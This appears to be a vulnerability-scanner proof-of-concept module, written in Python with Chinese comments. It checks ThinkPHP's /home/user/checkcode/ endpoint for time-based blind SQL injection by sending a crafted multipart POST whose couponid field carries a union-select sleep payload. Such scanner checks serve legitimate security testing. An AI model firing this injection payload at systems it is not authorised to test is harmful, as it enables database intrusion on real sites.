# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
import time


class Vuln(ABVuln):
    vuln_id = 'ThinkPHP_0003'  # 平台漏洞编号，留空
    name = 'ThinkPHP SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = 'Unknown'  # 漏洞公布时间
    desc = '''
        ThinkPHP index.php?s=/home/user/checkcode/ 参数过滤不严谨，导致SQL注入漏洞。 
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'ThinkPHP'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5d40aaaa-73a0-41c4-b7b8-fd99594ee7ae'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            hh = hackhttp.hackhttp()
            verify_url = self.target + '/index.php?s=/home/user/checkcode/'

            def make_raw(sleep_time):
                raw = '''
POST /index.php?s=/home/user/checkcode/ HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36
DNT: 1
Accept-Encoding: gzip, deflate, sdch
Accept-Language: zh-CN,zh;q=0.8
Content-Type: multipart/form-data; boundary=--------641902708
Content-Length: 123

----------641902708
Content-Disposition: form-data; name="couponid"

1') union select sleep('''+str(sleep_time)+''')#
----------641902708--
'''
                return raw
            for i in (1, 2):
                code1, head, res, errcode, _ = hh.http(
                    verify_url, raw=make_raw(1))
                timea = time.time()
                code2, head, res, errcode, _ = hh.http(
                    verify_url, raw=make_raw(5))
                timeb = time.time()
                if code1 == 200 and code2 == 200 and timeb - timea > 4.5:
                    # security_hole(poc)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
                    break

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
